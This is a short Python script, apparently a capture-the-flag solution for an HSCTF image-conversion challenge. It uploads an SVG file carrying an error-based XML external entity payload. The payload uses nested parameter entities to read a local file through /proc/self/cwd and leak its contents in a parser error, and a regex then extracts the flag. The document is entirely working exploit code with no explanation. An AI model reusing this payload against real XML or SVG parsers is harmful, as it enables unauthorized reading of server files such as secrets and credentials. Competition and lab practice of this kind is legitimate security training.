import requests
import re

url = "http://png-wizard-v3.hsctf.com/"

exploit_svg = """<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ 
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///proc/self/cwd/flag.txt">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]>
<svg width="520px" height="100px"  xmlns="http://www.w3.org/2000/svg">
    <g>
        <text font-size="13"  x="25" y="60">
           &error;
        </text>
    </g>
</svg>
"""

r = requests.post(url, files={"file": ("exploit.svg", exploit_svg)})

print(re.findall(r"flag{.*}", r.text)[0])